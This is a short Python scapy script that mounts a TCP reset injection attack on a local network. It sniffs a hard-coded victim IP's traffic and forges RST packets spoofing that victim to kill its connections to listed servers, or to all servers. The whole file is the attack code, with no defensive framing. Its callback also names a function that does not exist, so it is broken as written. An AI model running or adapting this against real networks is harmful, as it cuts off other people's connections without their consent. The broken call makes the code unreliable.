from scapy.all import *

clientTargetIP = "192.168.1.147"
macDst = "f4:f4:f4:f4:f4:f4" # it works with gateway's MAC
networkInterface = "wlp2s0" # choose the interface


# If filter server ip is none it will try to reset all the connections
def resetConnectionLocalToServer(packet, filterServerIp=None):

    cont = True


    # Get info
    ipDst = packet[IP].dst
    sPort = packet[TCP].sport
    dPort = packet[TCP].dport
    seqNum = packet[TCP].seq
    ackNum = packet[TCP].ack
    flags =  packet[TCP].flags

    if filterServerIp is not None:
        if ipDst not in filterServerIp:
            cont = False
        
    if cont:
        print("Packet captured: ")
        print(packet.summary())

        # don't send RST on RST packet, to avoid loop
        if 'R' not in flags and cont:

            # Craft RST packet
            ip = IP(src=clientTargetIP, dst=packet[IP].dst)
            tcp = TCP(sport=sPort, dport=dPort, flags='R', seq=seqNum)
            eth = Ether(dst=macDst)
            pkt = eth/ip/tcp
            sendp(pkt, iface = networkInterface, verbose=0)

            print("")
            print("Sent RST Packet")
            print(pkt.summary())
            print("")
    


    

print("Sniffing packets...")
filterSrc = "tcp and src host " + clientTargetIP
serverIps = ["x.x.x.x"] # insert server ips

pkt= sniff(filter=filterSrc, prn=lambda pkt: resetConnectionServerToLocal(pkt,serverIps), store=0)

